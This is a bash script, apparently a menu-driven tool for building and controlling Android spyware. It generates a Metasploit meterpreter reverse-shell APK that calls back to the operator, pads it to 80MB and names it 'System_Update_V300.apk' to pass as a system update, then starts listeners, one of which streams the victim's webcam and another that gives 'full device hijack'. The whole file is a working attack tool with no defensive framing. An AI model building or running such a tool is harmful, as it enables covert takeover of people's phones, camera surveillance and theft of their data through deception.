#!/bin/bash

# --- XXSZMSX V300 (HEAVY EDITION) ---
# AUTO-SIZE: 80MB | NO HOST | NO PORT | AUTO-LOOP

R='\033[1;31m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- SECURE LOGIN ---
clear
echo -e "${R}SYSTEM ENCRYPTED - VERSION 300 [HEAVY]${N}"
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""
if [[ $password != "topsecret2026" ]]; then exit 1; fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ ENGINE ]: v300.0 | [ APP SIZE ]: 80 MB (FIXED)"
echo -e "  [ STATUS ]: STEALTH MODE ACTIVE"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${R}GENERATE 80MB STEALTH APK${N}"
echo -e "${W}[02]${N} ${R}OPEN CAMERA RADAR${N}"
echo -e "${W}[03]${N} ${R}FULL DEVICE HIJACK${N}"
echo -e "${W}[00]${N} ${W}EXIT SYSTEM${N}"

echo -en "\n${R}[V300-HEAVY] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] BUILDING 80MB STEALTH APPLICATION...${N}"
        
        # سحب الـ IP تلقائياً
        target=$(hostname -I | awk '{print $1}')
        
        # 1. صنع ملف الاختراق الأساسي
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target LPORT=4444 R -o "base.apk" > /dev/null 2>&1
        
        # 2. توليد بيانات وهمية لزيادة المساحة لـ 80 ميجا
        # بنطرح مساحة الملف الأصلي من الـ 80 ميجا وبنكملها
        echo -e "${G}[*] Injecting 80MB stealth data...${N}"
        dd if=/dev/zero of=padding.dat bs=1M count=79 > /dev/null 2>&1
        
        # 3. دمج الملفات لإنتاج التطبيق النهائي
        cat base.apk padding.dat > "System_Update_V300.apk"
        
        # تنظيف الملفات المؤقتة
        rm base.apk padding.dat
        
        echo -e "\n${W}[+] SUCCESS: 80MB APK CREATED!${N}"
        echo -e "${G}[i] File: System_Update_V300.apk${N}"
        sleep 2
        ;;
    2)
        echo -e "\n${R}[!] RADAR ACTIVE... WAITING FOR SIGNAL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z; sleep 10; webcam_stream; exit"
        sleep 2
        ;;
    3)
        echo -e "\n${R}[!] INITIALIZING FULL CONTROL PANEL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit"
        sleep 2
        ;;
    0) exit ;;
esac
done
